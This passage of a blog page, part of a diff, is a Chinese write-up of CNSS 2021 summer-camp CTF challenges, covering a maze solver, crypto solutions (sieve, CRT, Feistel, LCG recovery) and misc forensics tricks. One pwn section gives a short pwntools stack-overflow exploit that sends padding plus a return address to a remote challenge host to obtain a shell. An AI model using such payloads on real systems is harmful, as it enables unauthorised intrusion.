+	<span class="k">if</span> <span class="n">x</span> <span class="o">==</span> <span class="n">n</span><span class="o">-</span><span class="mi">1</span> <span class="ow">and</span> <span class="n">y</span> <span class="o">==</span> <span class="n">m</span><span class="o">-</span><span class="mi">1</span><span class="p">:</span>
+		<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;done&#34;</span><span class="p">)</span>
+		<span class="n">ans</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+		<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">tpp</span><span class="p">):</span>
+			<span class="n">ans</span> <span class="o">+=</span> <span class="n">opts</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+		<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">ans</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+		<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;d&#34;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+		<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">tpp</span><span class="p">):</span>
+			<span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">())</span>
+		<span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">())</span>
+		<span class="n">flag</span> <span class="o">=</span> <span class="mi">1</span>
+		<span class="k">return</span>
+	<span class="n">vis</span><span class="p">[</span><span class="n">x</span><span class="p">][</span><span class="n">y</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span>
+	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">4</span><span class="p">):</span>
+		<span class="n">dx</span> <span class="o">=</span> <span class="n">x</span> <span class="o">+</span> <span class="n">fx</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+		<span class="n">dy</span> <span class="o">=</span> <span class="n">y</span> <span class="o">+</span> <span class="n">fy</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+		<span class="k">if</span> <span class="n">dx</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="ow">and</span> <span class="n">dx</span> <span class="o">&lt;</span> <span class="n">n</span> <span class="ow">and</span> <span class="n">dy</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="ow">and</span> <span class="n">dy</span> <span class="o">&lt;</span> <span class="n">m</span><span class="p">:</span>
+			<span class="k">if</span> <span class="n">vis</span><span class="p">[</span><span class="n">dx</span><span class="p">][</span><span class="n">dy</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span> <span class="ow">and</span> <span class="n">a</span><span class="p">[</span><span class="n">dx</span><span class="p">][</span><span class="n">dy</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+				<span class="k">if</span> <span class="n">tpp</span> <span class="o">==</span> <span class="n">mx</span><span class="p">:</span>
+					<span class="n">opts</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">op</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
+					<span class="n">tpp</span> <span class="o">=</span> <span class="n">tpp</span> <span class="o">+</span> <span class="mi">1</span>
+					<span class="n">mx</span> <span class="o">=</span> <span class="n">mx</span> <span class="o">+</span> <span class="mi">1</span>
+				<span class="k">else</span><span class="p">:</span>
+					<span class="n">opts</span><span class="p">[</span><span class="n">tpp</span><span class="p">]</span> <span class="o">=</span> <span class="n">op</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+					<span class="n">tpp</span> <span class="o">=</span> <span class="n">tpp</span> <span class="o">+</span> <span class="mi">1</span>
+				<span class="n">dfs</span><span class="p">(</span><span class="n">dx</span><span class="p">,</span> <span class="n">dy</span><span class="p">)</span>
+				<span class="n">tpp</span> <span class="o">=</span> <span class="n">tpp</span> <span class="o">-</span> <span class="mi">1</span>
+		<span class="k">if</span> <span class="n">flag</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+			<span class="k">return</span>
+	<span class="n">vis</span><span class="p">[</span><span class="n">x</span><span class="p">][</span><span class="n">y</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
+	<span class="n">a</span><span class="o">.</span><span class="n">append</span><span class="p">([])</span>
+	<span class="n">vis</span><span class="o">.</span><span class="n">append</span><span class="p">([])</span>
+	<span class="n">st</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="n">keepends</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
+	<span class="n">dat</span> <span class="o">=</span> <span class="n">st</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+	<span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">m</span><span class="p">):</span>
+		<span class="k">if</span> <span class="n">dat</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;#&#39;</span><span class="p">:</span>
+			<span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+		<span class="k">else</span><span class="p">:</span>
+			<span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+		<span class="n">vis</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="n">st</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="n">keepends</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
+<span class="n">st</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="n">keepends</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
+<span class="n">st</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="n">keepends</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
+
+<span class="n">dfs</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="0x01-让我康康你的nc">0x01 让我康康你的Nc</h3>
+<p>​	安装netcat，按题目方式连接之后cat flag即可得到结果。</p>
+<h3 id="0x02-网安的第一口饭">0x02 网安的第一口饭</h3>
+<p>​	简单栈溢出。反编译看到有一个here(void)调用了system(&quot;/bin/sh&rdquo;)，也就是说只要调用该程序便能获得类似shell的东西，可以直接cat flag。</p>
+<p>​</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;111.200.241.244&#39;</span><span class="p">,</span> <span class="mi">59471</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">12</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4011F5</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="crypto">Crypto</h2>
+<p><del>最有意思的难道不是crypto吗</del></p>
+<h3 id="龙王的代码i">龙王的代码I</h3>
+<p>​	看程序发现flag就是1000000之内素数的平方和。随便写个线性筛就可以得到答案了。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="cp">#include</span> <span class="cpf">&lt;bits/stdc++.h&gt;</span><span class="cp">
+</span><span class="cp"></span><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
+<span class="k">const</span> <span class="kt">int</span> <span class="n">MAXN</span> <span class="o">=</span> <span class="mi">10000050</span><span class="p">;</span>
+<span class="kt">int</span> <span class="n">notp</span><span class="p">[</span><span class="n">MAXN</span><span class="p">],</span> <span class="n">cntp</span><span class="p">,</span> <span class="n">p</span><span class="p">[</span><span class="n">MAXN</span><span class="p">],</span> <span class="n">n</span><span class="p">,</span> <span class="n">m</span><span class="p">;</span>
+<span class="kt">long</span> <span class="kt">long</span> <span class="n">ans</span><span class="p">;</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+	<span class="n">n</span> <span class="o">=</span> <span class="mi">1000000</span><span class="p">;</span> <span class="n">notp</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+	<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="n">n</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">notp</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="n">p</span><span class="p">[</span><span class="o">++</span><span class="n">cntp</span><span class="p">]</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
+		<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="mi">1ll</span><span class="o">*</span><span class="n">i</span><span class="o">*</span><span class="n">p</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="n">n</span> <span class="o">&amp;&amp;</span> <span class="n">j</span> <span class="o">&lt;=</span> <span class="n">cntp</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span><span class="p">)</span> <span class="p">{</span>
+			<span class="n">notp</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="n">p</span><span class="p">[</span><span class="n">j</span><span class="p">]]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+			<span class="k">if</span><span class="p">(</span><span class="n">i</span> <span class="o">%</span> <span class="n">p</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+	<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="n">n</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
+        <span class="n">ans</span> <span class="o">+=</span> <span class="p">(</span><span class="mi">1</span> <span class="o">-</span> <span class="n">notp</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">*</span> <span class="n">i</span> <span class="o">*</span> <span class="n">i</span><span class="p">;</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;%lld</span><span class="se">\n</span><span class="s">&#34;</span> <span class="n">ans</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="c1">//这份代码有一些小错误，直接抄写跑不出答案的哦！但是代码逻辑完全正确
+</span></code></pre></td></tr></table>
+</div>
+</div><h3 id="eeeeeezrsa">eeeeeezrsa</h3>
+<p>​	通过RSA解码方式直接求得即可。</p>
+<h3 id="龙王的代码ii">龙王的代码II</h3>
+<p>​	阅读代码发现即求：</p>
+<p>$$
+x\ ≡\ a1\ (mod\ p1)$$
+$$x\ ≡\ a2\ (mod\ p2)$$
+$$x\ ≡\ a3\ (mod\ p3)$$
+$$x\ ≡\ a4\ (mod\ p4)
+$$</p>
+<p>方程组中x的值。敲一遍扩展中国剩余定理板子即可得到结果。</p>
+<h3 id="feistal">Feistal</h3>
+<p>​	阅读代码，发现经过一次single操作后：
+$$
+L+R$$
+$$↓$$
+$$R+L\ xor\ R\ xor\ k
+$$
+​	而xor（异或）运算具有以下性质：
+$$
+a\ xor\ a = 0$$
+$$a\ xor\ 0 = a$$
+$$a\ xor\ b = b\ xor\ a
+$$
+​	程序为single操作执行256次的结果。那么我们先假设没有xor k操作来看看：
+$$
+L+R$$
+$$↓$$
+$$R+L\ xor\ R$$
+$$↓$$
+$$L\ xor\ R+L\ xor\ R\ xor\ R$$
+$$=L\ xor\ R+L$$
+$$↓$$
+$$L+L\ xor\ R\ xor\ L$$
+$$=L+R
+$$
+​	发现经过3次single操作后，回去了，神奇吧。由256 mod 3 = 1得如果没有每次xor k操作的话得到的序列将是L xor R + R（注意到最后有一个swap操作）</p>
+<p>​	考虑中间k值带来的影响。由于xor操作具有可交换性，所以左右各异或上一堆随机东西就相当于异或上这些东西的异或和。即最后的序列是：
+$$
+L\ xor\ R\ xor\ key1+R\ xor\ key2
+$$
+通过fake_flag和其加密结果求得key1，key2之后反向操作得到flag。</p>
+<h3 id="龙王的代码iii">龙王的代码III</h3>
+<p>即求：
+$$
+x^2≡a(mod\ p)
+$$
+二次剩余模板，打完就行了。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">random</span>
+
+<span class="n">n</span> <span class="o">=</span> <span class="mi">7705321458598879497</span>
+<span class="n">p</span> <span class="o">=</span> <span class="mi">12979492918818656033</span>
+
+<span class="n">w</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="k">def</span> <span class="nf">MUL</span><span class="p">(</span><span class="n">ax</span><span class="p">,</span> <span class="n">ay</span><span class="p">,</span> <span class="n">bx</span><span class="p">,</span> <span class="n">by</span><span class="p">):</span>
+	<span class="k">return</span> <span class="p">(</span><span class="n">ax</span> <span class="o">*</span> <span class="n">bx</span> <span class="o">%</span> <span class="n">p</span> <span class="o">+</span> <span class="n">ay</span> <span class="o">*</span> <span class="n">by</span> <span class="o">*</span> <span class="n">w</span> <span class="o">%</span> <span class="n">p</span><span class="p">)</span> <span class="o">%</span> <span class="n">p</span><span class="p">,</span> <span class="p">(</span><span class="n">ax</span> <span class="o">*</span> <span class="n">by</span> <span class="o">%</span> <span class="n">p</span> <span class="o">+</span> <span class="n">ay</span> <span class="o">*</span> <span class="n">bx</span> <span class="o">%</span> <span class="n">p</span><span class="p">)</span> <span class="o">%</span> <span class="n">p</span>
+
+<span class="k">def</span> <span class="nf">power</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
+	<span class="n">ax</span><span class="p">,</span> <span class="n">ay</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span>
+	<span class="k">while</span> <span class="n">b</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+		<span class="k">if</span> <span class="n">b</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span> <span class="n">ax</span><span class="p">,</span> <span class="n">ay</span> <span class="o">=</span> <span class="n">MUL</span><span class="p">(</span><span class="n">ax</span><span class="p">,</span> <span class="n">ay</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
+		<span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="o">=</span> <span class="n">MUL</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
+		<span class="n">b</span> <span class="o">//=</span> <span class="mi">2</span>
+	<span class="k">return</span> <span class="n">ax</span> <span class="o">%</span> <span class="n">p</span>
+
+<span class="k">while</span> <span class="mi">1</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+	<span class="n">a</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>
+	<span class="n">w</span> <span class="o">=</span> <span class="p">((</span><span class="n">a</span> <span class="o">*</span> <span class="n">a</span> <span class="o">%</span> <span class="n">p</span> <span class="o">-</span> <span class="n">n</span><span class="p">)</span> <span class="o">%</span> <span class="n">p</span> <span class="o">+</span> <span class="n">p</span><span class="p">)</span> <span class="o">%</span> <span class="n">p</span>
+	<span class="k">if</span> <span class="nb">pow</span><span class="p">(</span><span class="n">w</span><span class="p">,</span> <span class="p">(</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">//</span><span class="mi">2</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span> <span class="o">==</span> <span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">:</span> <span class="k">break</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">p</span> <span class="o">-</span> <span class="n">power</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="p">(</span><span class="n">p</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">//</span><span class="mi">2</span><span class="p">))</span>
+
+<span class="c1">#这份代码有一些小错误，直接抄写跑不出答案的哦！但是代码逻辑完全正确</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>这个数超过了C++能存的范围了（除非写高精），所以被迫写了python。</p>
+<h3 id="caesar">Caesar?!?</h3>
+<p>本专题最水的题目，你只需要把encrypto反着写一遍就有结果了。程序我都没保存。</p>
+<h3 id="prng">PRNG</h3>
+<p>这是一个线性同余生成器攻击。</p>
+<p>首先，如果我们找到几个X，使得X = 0 (mod n) 但 X ≠ 0</p>
+<p>此时，也就找到了几个X是n的倍数。那么这些X的最大公因数就有很大可能等于n，不是吗？</p>
+<p>回到题目，我们相当于得到了几个同余方程：
+$$
+s_1 ≡ s_0×a+b\ (mod \ n)
+$$</p>
+<p>$$
+s_2 ≡ s_1×a+b\ (mod \ n)
+$$</p>
+<p>$$
+s_3 ≡ s_2×a+b\ (mod \ n)
+$$</p>
+<p>此时我们引入一个数列$T_n=S_{n+1}-S_n$</p>
+<p>$$ T_0≡S_1-S_0\ (mod\ n) $$</p>
+<p>$$ T_1≡S_2-S_1≡(S_1×a+b)-(S_0×a+b)≡a×(S_1-S_0)≡a×T_0\ (mod\ n) $$</p>
+<p>$$ T_2≡S_3-S_2≡(S_2×a+b)-(S_1×a+b)≡a×(S_2-S_1)≡a×T_1\ (mod\ n) $$</p>
+<p>$$ T_4≡S_4-S_3≡(S_3×a+b)-(S_2×a+b)≡a×(S_3-S_2)≡a×T_2\ (mod\ n) $$</p>
+<p>这时候，神奇的事情发生了：</p>
+<p>$$T_2T_0-T_1^2≡(a×a×T_0×T_0)-(a×T_0×a×T_0)≡0(mod\ n)$$</p>
+<p>如此构造，就可以求出一些$X\ mod\ n=0$，从而求出$n$（事实上，可能要多试几次）</p>
+<p>有了$n$，还有$a$、$b$，咋办捏。</p>
+<p>$$ s_2 ≡ s_1×a+b\ (mod \ n) $$
+$$
+s_3 ≡ s_2×a+b\ (mod \ n)
+$$
+$$ s_3-s_2=s_2×a-s_1×a=a×(s_2-s_1) (mod\ n)$$</p>
+<p>$$ a=(s_3-s_2)/(s_2-s_1) (mod\ n)$$</p>
+<p>好耶。然后$b$随便解一下这题就结束了。</p>
+<h2 id="misc">Misc</h2>
+<h3 id="misc的文件">Misc的文件</h3>
+<p>下载解压，看到文件start.exe。记事本打开，前面写着PK。所以这是一个压缩包，改后缀名为zip打开。解压后发现两个文件，都用记事本打开。发现一个里面是一串字符，另一个文件头是PK。把文件头是PK的后缀名改为zip解压发现需要密码，输入刚刚获得的字符，解压获得flag。</p>
+<h3 id="no-password">No Password</h3>
+<p>总之我当时把Hello.png后缀名改成7z就成功了，但再试一遍发现不行了，怎么回事呢。</p>
+<h3 id="爱要大声说出来">爱要大声说出来</h3>
+<p>按照大小写转换成一串二进制数。已知开头是cnss，搜索自己的DNA得到c和n的ASCII码的二进制，前几位刚刚好是c和n的二进制ASCII，字符间用0隔开。长度固定分隔一下翻译回来得到flag。</p>
+<h3 id="baaby-task">baaby task</h3>
+<p>下载，记事本打开。</p>
+<h3 id="another-bb">another bb</h3>
+<p>下载，看不出啥端倪。根据文件类型PNG推测是LSB隐写。Stegsolve打开查看RGB的第0位得到答案。</p>
+<h3 id="casio3超爱emoji">Casio3超爱Emoji</h3>
+<p>百度搜索：emoji加密</p>
+<h2 id="我就会到这里了我好菜啊">我就会到这里了，我好菜啊。</h2>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2021-08-20</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/cnsssummer/index.md" target="_blank">阅读原始文档</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="http://sh11no.github.io/cnsssummer/" data-title="CNSS2021夏令营游记" data-via="Akarexol"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://sh11no.github.io/cnsssummer/"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="分享到 WhatsApp" data-sharer="whatsapp" data-url="http://sh11no.github.io/cnsssummer/" data-title="CNSS2021夏令营游记" data-web><i class="fab fa-whatsapp fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="http://sh11no.github.io/cnsssummer/" data-title="CNSS2021夏令营游记"><i data-svg-src="/lib/simple-icons/icons/line.min.svg"></i></a><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="http://sh11no.github.io/cnsssummer/" data-title="CNSS2021夏令营游记"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Myspace" data-sharer="myspace" data-url="http://sh11no.github.io/cnsssummer/" data-title="CNSS2021夏令营游记" data-description=""><i data-svg-src="/lib/simple-icons/icons/myspace.min.svg"></i></a><a href="javascript:void(0);" title="分享到 Blogger" data-sharer="blogger" data-url="http://sh11no.github.io/cnsssummer/" data-title="CNSS2021夏令营游记" data-description=""><i class="fab fa-blogger fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="http://sh11no.github.io/cnsssummer/" data-title="CNSS2021夏令营游记"><i class="fab fa-evernote fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/helloworld/" class="prev" rel="prev" title="Helloworld"><i class="fas fa-angle-left fa-fw"></i>Helloworld</a>
+            <a href="/reverse/" class="next" rel="next" title="Reverse学习笔记">Reverse学习笔记<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.87.0">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Shino</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.zh.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"data":{"id-1":"Shino","id-2":"Shino"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"$$","right":"$$"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"},{"display":false,"left":"$","right":"$"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
